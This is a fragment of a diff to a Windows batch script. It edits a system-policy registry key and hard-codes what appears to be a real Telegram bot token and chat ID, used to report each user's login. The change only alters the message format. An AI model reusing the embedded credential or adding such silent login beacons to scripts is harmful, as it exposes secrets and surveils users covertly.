@@ -26,7 +26,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%LoggedIn....."
+set "MESSAGEEVERY=%USERNAME%|LoggedIn....."
 
 
 :: URL encode the message by replacing spaces with %20
